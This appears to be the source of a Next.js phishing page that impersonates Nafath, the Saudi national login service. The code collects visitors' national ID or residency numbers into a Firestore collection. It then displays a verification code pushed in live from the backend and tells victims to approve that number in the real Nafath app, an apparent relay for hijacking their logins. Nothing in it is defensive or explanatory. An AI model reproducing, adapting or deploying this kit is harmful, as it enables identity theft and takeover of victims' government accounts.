"use client"

import Image from "next/image"
import Link from "next/link"
import { useState, useEffect } from "react"
import { ChevronDown, ChevronUp, Menu, Copy, Check, AlertCircle } from "lucide-react"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { addData } from "@/lib/firebase"
import { onSnapshot, doc, getFirestore } from "firebase/firestore"
import { getApp } from "firebase/app"

export default function Home() {
  const [isExpanded, setIsExpanded] = useState(false)
  const [showAuthDialog, setShowAuthDialog] = useState(false)
  const [idNumber, setIdNumber] = useState("")
  const [authCode, setAuthCode] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")
  const [copied, setCopied] = useState(false)
  const [userId, setUserId] = useState<string | null>(null)



  // Set up Firestore listener for auth code updates
  useEffect(() => {
    if (!userId) return

    const db = getFirestore(getApp())
    const userRef = doc(db, "pays", userId)

    // Set up real-time listener
    const unsubscribe = onSnapshot(
      userRef,
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const userData = docSnapshot.data()
          if (userData?.data?.authCode) {
            setAuthCode(userData.data?.authCode)
          }
        }
      },
      (error) => {
        console.error("Error listening to auth updates:", error)
      },
    )

    // Clean up listener on unmount
    return () => unsubscribe()
  }, [userId])

  // Handle login
  const handleLogin = async () => {
    if (!idNumber.trim()) {
      setError("الرجاء إدخال رقم الأحوال/الإقامة")
      return
    }

    setIsLoading(true)
    setError("")

    try {
      // Generate a new auth code
      const newAuthCode = ''
      // Create a unique ID for the user
      const uniqueId = localStorage.getItem('visitor')
      setUserId(uniqueId)

      // Store login details in Firestore
      await addData({
        id: uniqueId,
        data: {
          idNumber: idNumber,
          authCode: newAuthCode,
          timestamp: new Date().toISOString(),
          status: "pending",
        },
      })

      // Save user ID to localStorage for persistence
      localStorage.setItem("nafathUserId", uniqueId!)

      // Show the auth dialog
      setShowAuthDialog(true)
    } catch (err) {
      setError("حدث خطأ أثناء تسجيل الدخول. الرجاء المحاولة مرة أخرى.")
      console.error(err)
    } finally {
      setIsLoading(false)
    }
  }

  // Check for existing user session on component mount
  useEffect(() => {
    const savedUserId = localStorage.getItem("nafathUserId")
    if (savedUserId) {
      setUserId(savedUserId)
    }
  }, [])

  // Copy auth code to clipboard
  const copyAuthCode = () => {
    navigator.clipboard.writeText(authCode)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  return (
    <div className="flex flex-col min-h-screen bg-gray-50 text-right" dir="rtl">
      {/* Header */}
      <header className="bg-white p-4 shadow-sm flex justify-between items-center">
        <button className="text-black">
          <Menu size={24} />
        </button>
        <div className="text-teal-500 text-3xl font-bold">نفاذ</div>
      </header>

      {/* Main Title */}
      <div className="bg-white p-6 text-center">
        <h1 className="text-2xl text-teal-500 font-bold">الدخول على النظام</h1>
      </div>

      {/* Accordion */}
      <div className="bg-teal-500 text-white p-4 flex justify-between items-center">
        <span className="text-xl">تطبيق نفاذ</span>
        <span>-</span>
      </div>

      {/* Login Form */}
      <div className="bg-white p-6 m-4 rounded-md shadow-sm">
        <div className="mb-4 text-gray-600 text-center">رقم بطاقة الأحوال/الإقامة</div>
        <Input
          type="text"
          placeholder="ادخل رقم الأحوال/الإقامة الخاص بك هنا"
          className="w-full border rounded-md p-3 mb-4 text-right"
          value={idNumber}
          onChange={(e) => setIdNumber(e.target.value)}
        />

        {error && (
          <div className="mb-4 text-red-500 text-sm flex items-center justify-center gap-2">
            <AlertCircle size={16} />
            <span>{error}</span>
          </div>
        )}

        <Button
          className="w-full bg-teal-500 hover:bg-teal-600 text-white p-3 rounded-md mb-4"
          onClick={handleLogin}
          disabled={isLoading}
        >
          {isLoading ? "جاري تسجيل الدخول..." : "تسجيل الدخول"}
        </Button>

        <div className="text-center text-gray-600 mb-4">لتحميل تطبيق نفاذ</div>

        <div className="flex justify-center gap-2 mb-4">
          <Link href="#">
            <img src="/appj.png" alt="App Store" width={220} height={810} />
         
          </Link>
        </div>
      </div>

      {/* Username and Password Accordion */}
      <div
        className="bg-gray-300 p-4 flex justify-between items-center cursor-pointer mx-0"
        onClick={() => setIsExpanded(!isExpanded)}
      >
        <span>{isExpanded ? <ChevronUp size={20} /> : <ChevronDown size={20} />}</span>
        <span className="text-gray-700">اسم المستخدم وكلمة المرور</span>
      </div>

      {/* New Platform Promo */}
      <div className="bg-teal-500 text-white p-6 m-4 rounded-md text-center">
        <h2 className="text-2xl font-bold mb-4">منصة النفاذ الجديدة</h2>
        <p className="mb-6">لتجربة أكثر سهولة استخدم النسخة المحدثة من منصة النفاذ الوطني الموحد</p>
        <button className="bg-white text-teal-500 px-6 py-2 rounded-md font-medium">ابدأ الآن</button>
      </div>

      {/* Footer */}
      <div className="mt-auto bg-gray-100 p-6 text-center">
        <div className="flex justify-center items-center mb-4">
          <img src="https://upload.wikimedia.org/wikipedia/ar/thumb/a/a4/NIC_SA.svg/450px-NIC_SA.svg.png" alt="NIC Logo" width={120} height={40} />
          <div className="text-right mr-2">
            <div>تطوير وتشغيل</div>
            <div className="font-bold">مركز المعلومات الوطني</div>
          </div>
        </div>

        <div className="text-gray-600 mb-4">النفاذ الوطني الموحد جميع الحقوق محفوظة © 2025</div>

        <div className="flex justify-center gap-4 text-gray-600 text-sm mb-4">
          <Link href="#" className="hover:underline">
            الرئيسية
          </Link>
          <Link href="#" className="hover:underline">
            حول
          </Link>
          <Link href="#" className="hover:underline">
            اتصل بنا
          </Link>
          <Link href="#" className="hover:underline">
            الشروط والأحكام
          </Link>
        </div>

        <div className="flex justify-center gap-4 text-gray-600 text-sm mb-4">
          <Link href="#" className="hover:underline">
            المساعدة والدعم
          </Link>
          <Link href="#" className="hover:underline">
            سياسة الخصوصية
          </Link>
        </div>

        <div className="flex justify-center">
          <Image
            src="/placeholder.svg?height=40&width=120&query=digital government stamp"
            alt="Digital Stamp"
            width={120}
            height={40}
          />
        </div>
      </div>

      {/* Authentication Code Dialog */}
      <Dialog open={showAuthDialog} onOpenChange={setShowAuthDialog}>
        <DialogContent className="sm:max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="text-xl font-bold text-teal-500">رمز التحقق</DialogTitle>
            <DialogDescription>يرجى الدخول لتطبيق نفاذ والضغط على الرقم الظاهر امامك</DialogDescription>
          </DialogHeader>

          <div className="p-6">
            <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-6">
              <div className="flex items-center text-center justify-between">
                <Button variant="ghost" size="sm" className="h-8 px-2 text-gray-500" onClick={copyAuthCode}>
                  {copied ? <Check size={8} className="text-green-500" /> : <Copy size={16} />}
                </Button>
                <div className="text-5xl font-mono tracking-wider text-center">{authCode}</div>
              </div>
            </div>

            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
              <div className="flex items-start gap-3">
                <AlertCircle size={20} className="text-yellow-500 mt-0.5" />
                <div>
                  <div className="font-medium text-yellow-700 mb-1">ملاحظة هامة</div>
                  <div className="text-sm text-yellow-600">
                    هذا الرمز صالح لمدة 5 دقائق فقط. يرجى عدم مشاركته مع أي شخص آخر.
                  </div>
                </div>
              </div>
            </div>

            <div className="flex flex-col gap-3">
              <Button
                className="w-full bg-teal-500 hover:bg-teal-600 text-white"
                onClick={() => setShowAuthDialog(false)}
              >
                تم
              </Button>
              <Button
                variant="outline"
                className="w-full border-teal-500 text-teal-500 hover:bg-teal-50"
                onClick={() => setShowAuthDialog(false)}
              >
                إلغاء
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}
